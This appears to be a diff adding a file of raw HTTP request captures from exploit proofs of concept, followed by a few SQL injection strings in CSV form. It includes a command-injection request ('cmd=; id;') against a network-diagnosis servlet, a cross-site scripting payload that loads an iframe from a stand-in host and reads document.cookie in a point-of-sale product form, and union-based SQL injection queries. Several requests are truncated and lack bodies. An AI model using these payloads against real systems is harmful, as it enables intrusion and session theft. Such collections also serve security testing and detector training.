@@ -1,0 +1,80 @@
+POST /servlet?m=mod_data&p=network-diagnosis&q=docmd&Rajax=0.890925468511929 HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+Content-Length: 49
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://xxx.xxx.xxx.xxx
+Referer: http://xxx.xxx.xxx.xxx/servlet?m=mod_data&p=network-diagnosis&q=load
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: JSESSIONID=9a83d24461329a130
+Connection: close
+
+cmd=; id;&token=1714636915c6acea98
+
+POST /employee_gatepass/classes/Master.php?f=save_department HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------407760789114464123714007564888
+Content-Length: 555
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/employee_gatepass/admin/?page=maintenance/department
+Cookie: PHPSESSID=8d0l6t3pq47irgnbipjjesrv54
+
+POST /edtms/edtms/Actions.php?a=save_department HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 49
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/edtms/edtms/admin/?page=maintenance
+Cookie: PHPSESSID=bmh8mhmk3r0rksta56msbl7dn3
+
+POST /cms/classes/Login.php?f=login HTTP/1.1
+Host: localhost
+Content-Length: 51
+Accept: */*
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+Origin: http://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost/cms/admin/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=g1copl50hh7e2c8m1kenc0vikn
+Connection: close
+
+https://pos-uf.localhost.com:8000/products
+Host: pos-uf.localhost.com:8000
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Content-Type: multipart/form-data; boundary=---------------------------241608710739044240961361918599
+Content-Length: 3931
+Origin: https://pos-uf.localhost.com:8000
+Connection: keep-alive
+Referer: https://pos-uf.localhost.com:8000/products/create
+Cookie: ultimate_pos_session=eyJpdiI6InpjMmNRMEkycnU3MDIzeksrclNrWlE9PSIsInZhbHVlIjoiYmJWVjFBZWREODZFN3BCQ3praHZiaVwvV
+nhSMGQ1ZmM1cVc0YXZzOUg1YmpMVlB4VjVCZE5xMlwvNjFCK056Z3piIiwibWFjIjoiNmY3YTNiY2Y4MGM5NjQwNDYxOTliN2NjZWUxMWE4YTNhNmQzM2U2ZGRlZmI3OWU4ZjkyNWMwMGM2MDdkMmI3NSJ9
+_token=null&name=test"><iframe src=evil.source onload=alert(document.cookie)></iframe>&sku=&barcode_type=C128&unit_id=1&brand_id=
+&category_id=&sub_category_id=&product_locatio[]=1&enable_stock=1&alert_quantity=&product_description=&image=&product_brochure=
+&weight=&product_custom_field1=&product_custom_field2=&product_custom_field3=&product_custom_field4=&woocommerce_disable_sync=0&tax=&tax_type=exclusive
+&type=single&single_dpp=2.00&single_dpp_inc_tax=2.00&profit_percent=25.00&single_dsp=2.50&single_dsp_inc_tax=2.50&variation_images[]=&submit_type=submit
+
+
+
+" select * from users where id = '1' or ||= 1/1  union select 1,version (  )  -- 1'",1
+" select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'",1
+" select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",1
